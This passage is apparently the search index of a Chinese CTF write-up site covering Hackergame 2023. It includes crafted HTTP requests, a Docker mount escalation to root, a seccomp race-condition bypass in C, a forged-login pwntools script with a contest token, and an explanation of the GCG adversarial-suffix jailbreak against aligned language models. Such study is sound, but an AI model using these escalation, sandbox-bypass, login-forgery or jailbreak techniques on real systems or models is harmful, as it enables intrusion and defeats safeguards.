\u8d44\u6e90\u5bf9\u5e94\uff0c\u7528\u6765\u533a\u5206\u5bf9\u5e94\u8d44\u6e90\u4e0d\u540c\u7684\u7248\u672c\u3002\u5ba2\u6237\u7aef\u53ef\u4ee5\u5229\u7528\u8fd9\u4e2a\u4fe1\u606f\u6765\u8282\u7701\u5e26\u5bbd\u3002\u8fd9\u91cc If-Match \u5219\u5728\u5c1d\u8bd5\u5339\u914d\u8fd9\u4e2a ETag\uff0c\u5982\u679c\u4e0d\u5339\u914d\uff0c\u90a3\u5c31\u8fd4\u56de 412\u3002 GET / HTTP/1.1\\r\\n Host: example.com\\r\\n If-Match: \"bfc13a64729c4290ef5b2c2730249c88ca92d82d\"\\r\\n\\r\\n 413 Content Too Large. \u4e0d\u9700\u8981\u771f\u6b63\u8f93\u5165\u5f88\u5927\u7684 payload\uff0c\u628a Content-length \u5f04\u5f97\u5f88\u5927\u5c31\u884c\uff1a GET / HTTP/1.1\\r\\n Host: example.com\\r\\n Content-length: 1145141919810\\r\\n\\r\\n 414 URI Too Long. \u5927\u6982\u9700\u8981\u5f88\u957f\u7684 URI \u8def\u5f84\uff08\u4f46\u662f\u53c8\u4e0d\u80fd\u592a\u957f\uff0c\u5426\u5219 web \u754c\u9762\u672c\u4f53\u4e0d\u4f1a\u5141\u8bb8\u8fd9\u6837\u7684\u54cd\u5e94\uff09\u3002\u5185\u5bb9\u8be6\u89c1 414.txt \u3002 \u4ee5\u4e0a\u5c31\u5df2\u7ecf\u96c6\u6ee1\u4e86 12 \u4e2a\u3002\u5728\u9a8c\u9898\u65f6\u8fd8\u6709\u4e00\u4e2a HTTP code \u6f0f\u4e86\uff1a 501 Not Implemented. \u4ee3\u8868\u670d\u52a1\u5668\u4e0d\u652f\u6301\u6b64\u529f\u80fd\u3002Nginx \u6e90\u4ee3\u7801\u4e2d\u9ed8\u8ba4\u914d\u7f6e\u4e0b\u552f\u4e00\u53ef\u80fd\u89e6\u53d1\u7684\u5730\u65b9\u662f https://github.com/nginx/nginx/blob/a13ed7f5ed5bebdc0b9217ffafb75ab69f835a84/src/http/ngx_http_request.c#L2008 : } else { ngx_log_error ( NGX_LOG_INFO , r -> connection -> log , 0 , \"client sent unknown \\\" Transfer-Encoding \\\" : \\\" %V \\\" \" , & r -> headers_in . transfer_encoding -> value ); ngx_http_finalize_request ( r , NGX_HTTP_NOT_IMPLEMENTED ); return NGX_ERROR ; } else \u4e0a\u9762\u53ea\u5141\u8bb8 chunked \uff0c\u6240\u4ee5\u53ef\u4ee5\uff1a GET / HTTP/1.1\\r\\n Transfer-Encoding: gzip\\r\\n Host: example.com\\r\\n\\r\\n gzip \u6362\u6210\u9664\u4e86 chunked \u4ee5\u5916\u7684\u4efb\u610f\u5b57\u7b26\u4e32\u90fd\u884c\u3002 \u6700\u540e\u4e00\u4e2a\u95ee\u9898\uff1a\u6ca1\u6709\u72b6\u6001\u7801\u662f\u600e\u4e48\u56de\u4e8b\uff1f GET /\\r\\n \u8fd9\u91cc\u5b9e\u9645\u53d1\u9001\u7684\u662f HTTP/0.9 \u8bf7\u6c42\uff0c\u5b83\u53ea\u652f\u6301 GET \uff0c\u7136\u540e\u540e\u9762\u76f4\u63a5\u63a5 URL\uff0c\u6ca1\u6709\u522b\u7684\u3002\u7136\u540e\u54cd\u5e94\u5c31\u76f4\u63a5\u54cd\u5e94\u6587\u4ef6\u5185\u5bb9\uff0c\u4e5f\u6ca1\u6709\u72b6\u6001\u7801\u4e4b\u7c7b\u7684\u4e1c\u897f\u3002","title":"HTTP \u96c6\u90ae\u518c"},{"location":"ctf/writeups/hackergame2023/#docker-for-everyone","text":"\u8fd9\u9898\u8003\u70b9\u5c31\u662fdocker\u7528\u6237\u7ec4\u4e0eroot\u5176\u5b9e\u662f\u7b49\u4ef7\u7684\uff0c\u56e0\u6b64\u76f4\u63a5\u542f\u52a8\u4e00\u4e2a\u5bb9\u5668\u628aflag\u6302\u8f7d\u8fdb\u5bb9\u5668\u5373\u53ef\u5728\u5bb9\u5668\u5185\u8bfb\u53d6\u3002\u53e6\u5916\u6ce8\u610f\u4e00\u4e0b\u8f6f\u8fde\u63a5\u7684\u95ee\u9898\u5373\u53ef\u3002 docker run -it --rm -v /:/outside alpine","title":"Docker for Everyone"},{"location":"ctf/writeups/hackergame2023/#20","text":"\u76f4\u63a5\u66b4\u529b\u7a77\u4e3e\u5373\u53ef\uff0c\u5176\u5b9e\u6ee1\u8db3\u6761\u4ef6\u7684\u60c5\u51b5\u5f88\u591a\uff0c\u76f4\u63a5\u8fb9\u8dd1\u8fb9\u8f93\u51fa\u5c31\u5f88\u5feb\u80fd\u62ff\u5230flag\u4e86\u3002 \u89e3\u9898\u4ee3\u7801\uff08\u8fc7\u4e8e\u66b4\u529b\uff09 cod_dict = [] cod_dict += [ 'nymeh1niwemflcir}echaet' ] cod_dict += [ 'a3g7}kidgojernoetlsup?h' ] cod_dict += [ 'ulw!f5soadrhwnrsnstnoeq' ] cod_dict += [ 'ct{l-findiehaai{oveatas' ] cod_dict += [ 'ty9kxborszstguyd?!blm-p' ] def get_cod_dict ( c_dict ): return '' . join ( c_dict ) def decrypt_data ( input_codes ): flags = [] for k in range ( 23 ): print ( k ) for j in range ( 23 ): for t in range ( 23 ): for p in range ( 23 ): for f in range ( 23 ): cd_dict = cod_dict . copy () cd_dict [ 0 ] = cod_dict [ 0 ][: k ] + cod_dict [ 0 ][ k ] + cod_dict [ 0 ][ k :] cd_dict [ 1 ] = cod_dict [ 1 ][: j ] + cod_dict [ 1 ][ j ] + cod_dict [ 1 ][ j :] cd_dict [ 2 ] = cod_dict [ 2 ][: t ] + cod_dict [ 2 ][ t ] + cod_dict [ 2 ][ t :] cd_dict [ 3 ] = cod_dict [ 3 ][: p ] + cod_dict [ 3 ][ p ] + cod_dict [ 3 ][ p :] cd_dict [ 4 ] = cod_dict [ 4 ][: f ] + cod_dict [ 4 ][ f ] + cod_dict [ 4 ][ f :] print ( cd_dict ) st_dict = get_cod_dict ( cd_dict ) output_chars = [ st_dict [ c ] for c in input_codes ] if 'flag{' in '' . join ( output_chars ): flags . append ( '' . join ( output_chars )) return flags flags = decrypt_data ([ 53 , 41 , 85 , 109 , 75 , 1 , 33 , 48 , 77 , 90 , 17 , 118 , 36 , 25 , 13 , 89 , 90 , 3 , 63 , 25 , 31 , 77 , 27 , 60 , 3 , 118 , 24 , 62 , 54 , 61 , 25 , 63 , 77 , 36 , 5 , 32 , 60 , 67 , 113 , 28 ]) print ( set ( flags ))","title":"\u60dc\u5b57\u5982\u91d1 2.0"},{"location":"ctf/writeups/hackergame2023/#_6","text":"\u9898\u76ee\u4e2d\u7ed9\u7684\u662fasciinema\u5f55\u50cf\u6587\u4ef6\uff0c\u76f4\u63a5 asciinema cat \u5373\u53ef\u5f97\u5230\u5b57\u8282\u6d41\uff0c\u4e0d\u8fc7\u4f1a\u6709\u5f88\u591a\u989d\u5916\u4e0d\u9700\u8981\u7684\u4e1c\u897f\uff0c\u5220\u8d77\u6765\u6bd4\u8f83\u9ebb\u70e6\uff0c\u770b\u5230asciinema\u5f55\u5236\u7684\u65f6\u5019\u6709raw\u9009\u9879\uff0c\u4e8e\u662f\u91cd\u65b0\u5f55\u4e86\u4e00\u904d\uff0c\u8fd9\u6837\u5b57\u8282\u6d41\u5c31\u5e72\u51c0\u5f88\u591a\uff0c\u7a0d\u5fae\u6539\u4e00\u4e0b\uff0c\u8fd0\u884c\u5373\u53ef\u3002","title":"\ud83e\ude90 \u9ad8\u9891\u7387\u661f\u7403"},{"location":"ctf/writeups/hackergame2023/#_7","text":"\u5f88\u65b0\u9896\u7684AI\u9898\u76ee\uff0c\u5bf9\u4e8e\u6211\u6765\u8bf4\u53ea\u80fd\u4e71\u8bd5\uff0c\u7b2c\u4e00\u95ee\u76f4\u63a5\u7528repeat\u5927\u6cd5\u5c31\u53ef\u5b8c\u6210\u3002 \u7b2c\u4e8c\u95ee\u5176\u5b9e\u601d\u8def\u5bf9\u7684\uff0c\u4e0d\u8fc7\u6211\u5acc\u9ebb\u70e6\uff0c\u6ca1\u6709\u53bb\u7a77\u4e3ehhh\u3002 \u540e\u9762\u4e24\u95ee\u786e\u5b9e\u53ef\u4ee5\u7684\uff0c\u5b66\u4e60\u4e86\u3002 \u5b98\u65b9\u9898\u89e3","title":"\ud83e\ude90 \u5c0f\u578b\u5927\u8bed\u8a00\u6a21\u578b\u661f\u7403"},{"location":"ctf/writeups/hackergame2023/#llm-attacks","text":"\u8bba\u6587\uff1a Universal and Transferable Adversarial Attacks on Aligned Language Models","title":"LLM Attacks"},{"location":"ctf/writeups/hackergame2023/#background","text":"\u4e00\u4e2a Decoder-Only \u7684 LLM \u5c06\u4e00\u4e32 token \\(x_{1:n}\\) \u6620\u5c04\u5230\u4e0b\u4e00\u4e2a token \\(x_{n+1}\\) \u3002\u8bed\u8a00\u6a21\u578b\u6240\u9700\u8981\u5b66\u4e60\u7684\u5219\u662f\u5728\u7ed9\u5b9a\u4e4b\u524d\u7684 token \\(x_{1:n}\\) \uff0c\u5f97\u5230\u4e0b\u4e00\u4e2a token \\(x_{n+1}\\) \u7684\u6982\u7387 \\(p(x_{n+1} | x_{1:n})\\) \u3002\u5176\u4e2d\u6bcf\u4e00\u4e2a \\(x_i \\in {1, ... V}\\) \u90fd\u662f\u8bcd\u8868\u4e2d\u7684\u4e00\u4e2a token\u3002\u5982\u679c\u60f3\u8981\u8ba9\u6a21\u578b\u8f93\u5165\u4e00\u6bb5\u5e8f\u5217\uff0c\u5e8f\u5217\u4e2d\u6bcf\u4e00\u4e2a token \u90fd\u53ea\u4e0e\u4e4b\u524d\u7684\u6240\u6709 token \u6709\u5173\uff0c\u56e0\u6b64\u6a21\u578b\u8f93\u51fa\u4e00\u6bb5\u5e8f\u5217 \\(x_{n+1:n+H}\\) \u7684\u6982\u7387\u4e3a \\[p(x_{n+1:n+H}|x_{1:n}) = \\prod_{i=1}^H p(x_{n+i} | x_{1:n+i-1})\\]","title":"Background"},{"location":"ctf/writeups/hackergame2023/#method","text":"\u5982\u679c\u6211\u4eec\u5e0c\u671b\u6a21\u578b\u80fd\u591f\u8f93\u51fa\u4e00\u4e2a\u6307\u5b9a\u7684\u5e8f\u5217\uff0c\u5c31\u662f\u5e0c\u671b \\(p(x_{n+1:n+H}|x_{1:n})\\) \u5c3d\u53ef\u80fd\u9ad8\uff0c\u4ee5\u6b64\u51fa\u53d1\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u4f18\u5316\u76ee\u6807 \\[\\mathcal{L}(x_{1:n}) = -\\log p(x^\\star_{n+1:n+H} | x_{1:n})\\] \u4f46\u662f\u4e0e\u5e38\u89c1\u7684\u56fe\u7247\u4e0a\u9762\u7684\u5bf9\u6297\u6837\u672c\u653b\u51fb\u4e0d\u540c\uff0cLLM \u7684\u8f93\u5165\u662f\u76f8\u5bf9\u79bb\u6563\u7684 token\uff0c\u65e0\u6cd5\u8fdb\u884c\u8fde\u7eed\u7684\u53d8\u5316\u3002\u56e0\u6b64\u4f5c\u8005\u6839\u636e AutoPrompt [1]\uff0c\u8bbe\u8ba1\u4e86 Greedy Coordinate Gradient \u6765\u5c3d\u53ef\u80fd\u9ad8\u6548\u5730\u5bf9\u79bb\u6563\u7684\u8f93\u5165\u8fdb\u884c\u4f18\u5316\u3002 \u901a\u4fd7\u6765\u8bb2\uff0c\u6211\u4eec\u5e0c\u671b\u80fd\u591f\u5c06\u539f\u6709\u8f93\u5165\u7684 Prompt \u4e2d\u7684\u67d0\u4e00\u4e9b token \u66ff\u6362\u4e3a\u65b0\u7684 token\uff0c\u5e76\u4e14\u8ba9\u66ff\u6362\u4e4b\u540e\u5c3d\u53ef\u80fd\u8ba9\u8f93\u51fa\u7684 target loss \u5c3d\u53ef\u80fd\u964d\u4f4e\u3002 \u4f5c\u8005\u7528\u4e00\u4e2a\u957f\u5ea6\u4e3a \\(V\\) \u7684 one hot \u5411\u91cf\u6765\u4ee3\u8868\u5f53\u524d\u4f4d\u7f6e\u7684 token\uff0c\u8be5 one hot \u5411\u91cf\u4e0e embedding layer\uff08\u5927\u5c0f\u4e3a \\(R^{\\mathrm{dim} \\times V}\\) \uff09\u76f8\u4e58\u540e\u53ef\u4ee5\u5f97\u5230\u8be5 token \u5bf9\u5e94\u7684 embedding\uff0c\u8be5 embedding \u88ab\u8f93\u5165\u7ed9\u4e86\u6a21\u578b\u3002\u5728\u53cd\u5411\u4f20\u64ad\u540e\uff0cone hot \u5411\u91cf\u7684\u6bcf\u4e00\u4e2a\u4f4d\u7f6e \\(i\\) \u90fd\u6709\u5bf9\u5e94\u7684\u68af\u5ea6 \\(\\mathrm{grad}_i\\) \uff0c \\(\\mathrm{grad}_i < 0\\) \u8bf4\u660e\u5982\u679c\u5c06\u539f\u672c\u7684 token \u66ff\u6362\u4e3a\u8bcd\u8868\u4e2d\u7684\u7b2c \\(i\\) \u4e2a token\uff0c\u80fd\u591f\u4f7f\u5f97\u8f93\u51fa\u7684 loss \u4e0b\u964d\u3002 \u57fa\u4e8e\u8fd9\u4e2a\u68af\u5ea6\uff0c\u6211\u4eec\u9009\u51fa\u4e86 top-k \u4e2a\u6700\u5c0f\u7684\u66ff\u6362 token\uff08\u7b97\u6cd5\u7684\u7b2c 4 \u884c\uff09\u3002\u7136\u540e\u6211\u4eec\u968f\u673a\u9009\u62e9 prompt \u7684 token \u7684\u4f4d\u7f6e\uff0c\u5c06\u5176\u968f\u673a\u66ff\u6362\u4e3a\u68af\u5ea6\u6700\u5c0f\u7684 k \u4e2a\u4e4b\u4e00\u3002\u91cd\u590d\u4e0a\u8ff0\u66ff\u6362\u591a\u6b21\uff0c\u9009\u62e9\u51fa\u66ff\u6362\u540e loss \u6700\u5c0f\u7684 prompt \u4f5c\u4e3a\u4e0b\u4e00\u6b21\u8fed\u4ee3\u7684\u521d\u59cb\u503c\u3002 [1]: AutoPrompt: Eliciting Knowledge from Language Models with Automatically Generated Prompts. https://arxiv.org/abs/2010.15980","title":"Method"},{"location":"ctf/writeups/hackergame2023/#_8","text":"\u9700\u8981\u77e5\u9053\u56fe\u50cf\u7684\u957f\u5bbd\uff0c\u600e\u4e48\u529e\u5462\uff1f\u624b\u52a8plot\u51fa\u6765\u770b\u5457\uff0c\u53cd\u6b63\u8bd5\u4e00\u4e0b\u5f88\u5bb9\u6613\u627e\u5230\u5468\u671f\u6027\u91cd\u590d\u7684\u4e1c\u897f\uff0c\u7136\u540e\u5fae\u8c03\u4e00\u4e0b\u5f97\u5230\u957f\u5bbd\uff0c\u76f4\u63a5\u8f93\u51fa\u89c6\u9891\u5373\u53ef\u3002 \u89e3\u9898\u4ee3\u7801 import cv2 import numpy as np def restore_video ( buffer , output ): frame_width = 427 frame_height = 759 frame_count = 139 video_writer = cv2 . VideoWriter ( output , cv2 . VideoWriter_fourcc ( * \"mp4v\" ), 30.0 , ( frame_width , frame_height )) for i in range ( frame_count ): frame = buffer [ i ] . astype ( np . uint8 ) video_writer . write ( frame ) video_writer . release () if __name__ == \"__main__\" : with open ( \"video.bin\" , \"rb\" ) as input_file : buffer = np . fromfile ( input_file , dtype = np . uint8 ) print ( buffer . shape ) num = [ 2 , 5 , 8 , 11 , 14 , 17 , 20 , 23 , 26 , 29 , 32 , 35 , 38 , 41 , 44 , 47 , 50 , 53 , 56 , 59 , 62 , 65 , 68 , 71 , 74 , 77 , 80 , 83 , 86 , 89 , 92 , 95 , 98 ] nums = [] f = np . append ( buffer , np . zeros ( 93 , dtype = np . uint8 )) f = f . reshape (( - 1 , 759 , 427 , 3 )) restore_video ( f , \"video.mp4\" )","title":"\ud83e\ude90 \u6d41\u5f0f\u661f\u7403"},{"location":"ctf/writeups/hackergame2023/#_9","text":"\u8fd9\u4e00\u9898\u7b2c\u4e00\u95ee\u6ca1\u4ec0\u4e48\u95ee\u9898\uff0c\u968f\u4fbf\u538b\u7f29\u4e00\u4e0b\u5c31\u80fd\u8fc7\u3002\u7b2c\u4e8c\u9898\u6709\u70b9\u6298\u78e8\uff0c\u601d\u8def\u662f\u5bf9\u7684\uff0c\u53bb\u627e libvips \u652f\u6301\u7684\u56fe\u50cf\u683c\u5f0f\uff0c\u5c31\u662f\u6211\u592a\u61d2\u4e86\u6ca1\u53bb\u4ed4\u7ec6\u7ffb\uff0c\u4e00\u4e2a\u52b2\u5730\u7422\u78e8SVG\u53bb\u4e86\uff0c\u5bfc\u81f4\u6ca1\u505a\u51fa\u6765\uff0c\u5f88\u53ef\u60dc\u3002\u8fd9\u9053\u9898\u7528JXL\u7684\u683c\u5f0f\u6765\u89e3\u7684\u3002","title":"\ud83e\ude90 \u4f4e\u5e26\u5bbd\u661f\u7403"},{"location":"ctf/writeups/hackergame2023/#komm-susser-flagge","text":"\u8fd9\u9053\u9898\u5c31\u662f\u5bf9TCP/IP\u6570\u636e\u5305\u7684\u4fee\u6539\uff0c\u7b2c\u4e00\u95ee\u76f4\u63a5\u4e00\u4e2a\u5b57\u8282\u4e00\u4e2a\u5b57\u8282\u53d1\u9001\u5373\u53ef\u7ed5\u8fc7\uff0c\u7b2c\u4e8c\u95ee\u5176\u5b9e\u975e\u9884\u671f\u4e86\uff0c\u56e0\u4e3a\u4e00\u4e2a\u5b57\u8282\u6ca1\u6709\u5230u32\u7684\u8981\u6c42\uff0c\u76f4\u63a5\u7ed5\u8fc7\u4e86hhh\u3002 \u7b2c\u4e09\u95ee\u601d\u8def\u5176\u5b9e\u5bf9\u4e86\uff0c\u5c31\u662f\u4fee\u6539TCP\u4e2d\u7684OPTION\u90e8\u5206\uff0c\u4e0d\u8fc7\u5f53\u65f6\u5f88\u5fd9\uff0c\u7528python\u5199\u7684\u6709\u70b9\u5947\u602a\uff0c\u6ca1\u7ec6\u8c03\uff0c\u5982\u679c\u7a7a\u95f2\u7684\u8bdd\u5e94\u8be5\u505a\u51fa\u6765\u6ca1\u95ee\u9898\u3002","title":"Komm, s\u00fcsser Flagge"},{"location":"ctf/writeups/hackergame2023/#flag_1","text":"\u7b2c\u4e00\u95ee\u5f88easy\u76f4\u63a5\u9759\u6001\u7f16\u8bd1\u540e\u63d0\u4ea4\u5373\u53ef\u3002\u7b2c\u4e8c\u95ee\u770b\u4e86\u5b98\u65b9\u9898\u89e3\u4e4b\u540e\uff0c\u77e5\u9053\u8981\u591a\u770b\u6ce8\u91ca\uff0c\u7528\u7ebf\u7a0b\u7684\u65b9\u5f0f\u6765\u7ed5\u8fc7seccomp\uff0c\u5b66\u4e60\u4e86\u3002 \u5b98\u65b9\u9898\u89e3 #include <stdio.h> #include <pthread.h> #include <fcntl.h> #include <unistd.h> #include <stdlib.h> #include <time.h> char flagfile [] = \"/flag\" ; void * read_file () { char buf [ 100 ] = {}; while ( 1 ) { int f = open ( flagfile , O_RDONLY ); if ( ! f ) { continue ; } read ( f , buf , 99 ); if ( buf [ 0 ] && buf [ 0 ] != 'I' ) { printf ( \"%s \\n \" , buf ); exit ( 0 ); } close ( f ); } } void * modify () { struct timespec req ; req . tv_sec = 0 ; req . tv_nsec = 50 ; while ( 1 ) { flagfile [ 1 ] = 'a' ; // sleep is not allowed. So just don't sleep. // nanosleep(&req, NULL); flagfile [ 1 ] = 'f' ; } } int main () { printf ( \"pthread \\n \" ); pthread_t t1 , t2 ; pthread_create ( & t1 , NULL , read_file , NULL ); pthread_create ( & t2 , NULL , modify , NULL ); pthread_join ( t1 , NULL ); pthread_join ( t2 , NULL ); printf ( \"done? \\n \" ); return 0 ; }","title":"\u4e3a\u4ec0\u4e48\u8981\u6253\u5f00 /flag \ud83d\ude21"},{"location":"ctf/writeups/hackergame2023/#_10","text":"\u5f88\u597d\u73a9\u7684\u5c0f\u6e38\u620f\uff0c\u5c31\u5f53\u653e\u677e\u4e00\u4e0b\uff0c\u903b\u8f91\u5f88\u7b80\u5355\uff08\u5c0f\u5fc3\u7206\u70b8\uff0c\u7b2c\u4e00\u6b21\u5fd8\u8bb0\u5148\u901a\u51b7\u5374\u6db2\u4e86","title":"\u5f02\u661f\u6b67\u9014"},{"location":"ctf/writeups/hackergame2023/#20_1","text":"\u8fd9\u9053\u9898\u5f88\u70e6\uff0c\u5c31\u662f\u611f\u89c9\u81ea\u5df1\u5feb\u505a\u51fa\u6765\u4e86\uff0c\u5c31\u5dee\u4e00\u70b9\u70b9\uff0c\u6240\u4ee5\u9700\u8981\u603b\u7ed3\u4e00\u4e0b\u7ecf\u9a8c\u6559\u8bad\u3002 \u5176\u5b9e\u4e5f\u6ca1\u4ec0\u4e48\u597d\u603b\u7ed3\u7684\uff0c\u5c31\u662f\u6ca1\u6ce8\u610f\u5230 updateElement \uff0c\u5bfc\u81f4\u4e0d\u77e5\u9053\u600e\u4e48\u7ed5\u8fc7\u957f\u5ea6\u9650\u5236\u3002\u4e5f\u662f\u81ea\u5df1\u83dc\uff0c\u5176\u5b9e\u6ca1\u600e\u4e48\u505a\u8fc7XSS\u7684\u9898\u76ee\uff0c\u8fd8\u662f\u9700\u8981\u79ef\u7d2f\u7ecf\u9a8c\uff0c\u611f\u89c9\u597d\u7684XSS\u9898\u76ee\u4e0d\u591a\u3002","title":"\u5fae\u79ef\u5206\u8ba1\u7b97\u5c0f\u7ec3\u4e60 2.0"},{"location":"ctf/writeups/hackergame2023/#f5","text":"\u8fd9\u9053\u9898\u8bb0\u5f55\u4e00\u4e0b\uff0c\u56e0\u4e3a\u9006\u5411\u7684\u9898\u76ee\u505a\u5f97\u5c11\uff0c\u6240\u4ee5\u9700\u8981\u79ef\u7d2f\u4e00\u4e0b\u3002 \u5b98\u65b9\u9898\u89e3\u4e2d\u9700\u8981\u8bb0\u5f55\u7684\u4e60\u60ef import angr , monkeyhex , claripy proj = angr . Project ( 'no_need_for_F5/main.exe' ) flag_chars = [ claripy . BVS ( 'flag_ %d ' % i , 8 ) for i in range ( 32 )] flag = claripy . Concat ( * [ claripy . BVV ( b 'flag{' )] + flag_chars + [ claripy . BVV ( b '} \\x00 ' )]) state = proj . factory . call_state ( 0x140001000 ) input_addr = 0 @proj . hook ( 0x140001093 , length = 5 ) def get_input ( state ): global input_addr input_addr = state . regs . rdx state . memory . store ( input_addr , flag ) print ( 'Input done' ) @proj . hook ( 0x140001079 , length = 5 ) def printf ( state ): return simgr = proj . factory . simgr ( state ) simgr . explore ( find = 0x1400013A1 , avoid = 0x1400013B7 ) simgr . found [ 0 ] . solver . eval ( flag ) . to_bytes ( 39 , \"big\" )","title":"\u9006\u5411\u5de5\u7a0b\u4e0d\u9700\u8981 F5"},{"location":"ctf/writeups/hackergame2023/#o1","text":"\u6839\u636e\u54c8\u5e0c\u4e66\u7684\u7279\u6027\uff0c\u56e0\u6b64\u6211\u4eec\u53ea\u9700\u8981\u6784\u9020\u4e00\u4e2a\u7528\u6237\uff0c\u4f7f\u5f97\u5b83\u7684SHA1\u503c\u7b49\u4ef7\u4e8e\u5176\u5b50\u8282\u70b9\u5b58\u5728admin\u7528\u6237\u5373\u53ef\u3002\u8fd9\u91cc\u6ce8\u610f\u9700\u8981SHA1\u503c\u80fd\u591f\u88abUTF-8\u89e3\u7801\u5373\u53ef\u3002 \u8fd9\u91cc\u6211\u5148\u627e\u4e86\u5982\u4e0b\u4e24\u4e2a\u7528\u6237\uff1a admin:aaaadcLd admin:aaaaanRH \u8fd9\u91cc\u5176\u5b9e\u53ef\u4ee5\u968f\u4fbf\u641c\u7d22\uff0c\u4e0b\u9762\u90fd\u4ee3\u7801\u6539\u4e00\u4e0b\u90fd\u53ef\u4ee5\u641c\uff0c\u968f\u4fbf\u641c\u3002 \u641c\u7d22\u5408\u9002\u7684admin\u7528\u6237 from itertools import product str1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789' prefix = 'admin:' for i in product ( str1 , repeat = 8 ): user = prefix + '' . join ( i ) x = f ( user . encode ()) # x = com(x, x) if b ':' not in x : try : x . decode () print ( user , x ) except : pass \u7136\u540e\u5c31\u7b97\u4e00\u4e0bSHA1\u540e\u62fc\u63a5\u5373\u53ef\uff0c\u89e3\u9898\u811a\u672c\u5982\u4e0b\uff1a \u89e3\u9898\u811a\u672c\uff08\u4fee\u6539\u7248\uff0c\u539f\u7248\u592a\u6742\u4e71\u4e86\uff09 from hashlib import sha1 from pwn import * f = lambda data : sha1 ( data ) def com ( x , y ): if isinstance ( x , bytes ): t = x else : t = x . digest () if isinstance ( y , bytes ): p = y else : p = y . digest () if t > p : t , p = p , t return t + p if __name__ == '__main__' : p = remote ( '202.38.93.111' , 10094 ) token = b '2269:MEUCIFS9KtX84tx7Ri01S4JNBKL/H1pJ2+sHChO3/WlK7QsXAiEA5cTIFBDrdJQfvOANFq0hGHLglZHY31APxc62zvSnKug=' p . recvuntil ( 'token:' ) p . sendline ( token ) p . recvuntil ( 'Choice:' ) p . sendline ( b '1' ) def sendu ( data ): p . recvuntil ( '>' ) p . sendline ( data ) test0 = [ b 'admin:aaaadcLd' , b 'admin:aaaaanRH' ] test1 = b 'a:a' test3 = com ( f ( test0 [ 0 ]), f ( test0 [ 1 ])) sendu ( test1 ) sendu ( test3 ) sendu ( b 'EOF' ) p . recvuntil ( 'Choice:' ) p . sendline ( b '2' ) p . recvuntil ( 'Login credential: ' ) p . sendline ( test0 [ 0 ] . decode () + ':' + f ( test0 [ 1 ]) . hexdigest () + sha1 ( test1 ) . hexdigest ()) p . interactive ()","title":"O(1) \u7528\u6237\u767b\u5f55\u7cfb\u7edf"},{"location":"ctf/writeups/hackergame2023/#_11","text":"\u540e\u9762\u7684\u9898\u76ee\u5176\u5b9e\u6ca1\u600e\u4e48\u770b\uff0c\u5c31\u6682\u65f6\u5148\u4e0d\u5199\u4e86\uff0c\u7b49\u4ee5\u540e\u6709\u65f6\u95f4\u7a7a\u4e86\u7814\u7a76\u540e\u518d\u8bb0\u5f55\u4e00\u4e0b\u5427\u3002","title":"\u5176\u4ed6"},{"location":"ctf/writeups/hackergame2024/","text":"Hackergame 2024 \u00b6 \u7ea6 11 \u4e2a\u5b57 Abstract \u61d2\u5f97\u5199\uff0c\u7a7a\u4e86\u8865\uff08\u753b\u997c","title":"Hackergame 2024"},{"location":"ctf/writeups/hackergame2024/#hackergame-2024","text":"\u7ea6 11 \u4e2a\u5b57 Abstract \u61d2\u5f97\u5199\uff0c\u7a7a\u4e86\u8865\uff08\u753b\u997c","title":"Hackergame 2024"},{"location":"ctf/writeups/zjuctf2023/","text":"fSwkwjLLj0yQ4PLh5S2vwQ==;/dYt7OMlX5+vbMaRv52kfm0XyWC/RO4x+zpkW/+P/pbfygr68clReRNvsuAbE9btXUVTfaVB+UuYcyN0IxSpIp4vocb3zmYnvsZiksqkt0/Qtnpk2QLKOwJfyKwk/K8nI40T0Up3Jt9dsrI/pntoJGKdbk7pF5qG1OQL4sB+mIroEwl//oOnSm6s9hnK7sYS+YMTjAp1VspjQ92/BY0hzxnBKCM17PtXGw7KjRfjxbIe8sRLzbiVkEfd+g9mTtMASIgc/SzzTYm5YlMSEUmBQjXiaybAg93qtUSI9VRb9EjhwwphhQOIBoLwHmstSnx0+6tmq78PCYJefxD8UBjVPuFtn03awYfgJCz1VFtk+kDPzSLhO1/+OiV9EPGJeSvTmeFFvmD8h33iPMSToxazFAyf9jU0/YE8wdWuHZPLCY91Xuofwv08Cs9DUf/loElFT4EQhi5OYEQf7XOsuS4f1CWKhj0GYbLTyc5xIS23BYcPsUfjcB0e7PhwWcoT4tbVB8IGC1wO9t0n1ZDgCqD04+0xGWWTvaxz41K3HP2jlDGFqsvR36Z5hn+nDo0Y+fYQyifnpDFTywTzxhL1LqCYcintVuUqWyyfCfvT2DmRfbKr1IHA5ZKm/TkUauAaeiSRKNIQqLF6Ds9zBfGxOvOL+8st6Ikv7m5q8QILB5gYqb0nEKaaN724I9HFrFi8HMRjtrgyoZtiUfv7cA4xfU5R2V8fxvOhW52WYIE/ZGHOI0ZnKp1wJDCestSxVSf3Mx/Vq5XBQEbMTX1TJXpruL3tzzSO/Rnd21BclVabmB4xPOeNvjHDULBSAsJYA/hq/J2L+oUEOvGeln4t/spQK1m7kO77/3rmmxwmaMPlLAIj5/JQCw35qOu091e8VY/ex2R0YP/52Y9oZWvpZ61twOdPf0ygJ/T5i9mpxcvsKNt6rff4T5VyOCu8rHMI9YR3+CAK+MvbaMeJ9EecZMkelj7JSiMo+o7O86wS4SoSNK15ZrQWzqsyTqoX6mfvoYZm68XlmFU5ivMnYLX/5HN2O7Q9T4pJQGFIShV9XqpdsQdo52CPm9qwWSG17lNqUtx/K3ierjMIK33kAYDC55JNuKWpneRVIiGgRy/P5PKF99hygdacuEu3qJTY/gRB6kZD5MNTZPVvRnoMpSTeG9k5ytxtVsMJP29NknGtRPrFTmOeL9wVzzgxz7J1sXFg2tKn3pnMZnMsDCHjGkgupUUZUXTxYyH92VEO+V3bXdMsLlsm9u9qSOZdbGx9kaSrrHoUlBai5GDyQFSzBsaclY5aiA6oSNTsJz2536WlC2Dd4lMFhJ9YzWMttMcAPhyEDXefA0QFdgRimkx48vGYqLVOS36Dznq9wPMoOKq/WaxwtyFyomx2J+Y9ADY6HjkIZpASM1T8cO2HIZlEQC1+RHWi6rVpVZ24SRbTlAumIz7s3aMZ1MNfS0ab/j53gt8I0ppnRCBRYUgWiubTlqqJ8Zfz8paFQQG7TEq259Z2pc/ZV6EGmvBlB/qs/cfb629picMOPs+g/bkTmTz18BRq/3RIsP6IYV5uYXRAsVjstgVMxhSxLtNqWWbdpohvX39aR7Vf5eS4s0d1GEQ7sqCxs09cyguZpr7RxPfU7V2nnuF1lDWRKmOiTSVDsYESJlUvA78xceN7NSi+ktW77a/eG6J6eBDlYDYLcY/pZXXdzjK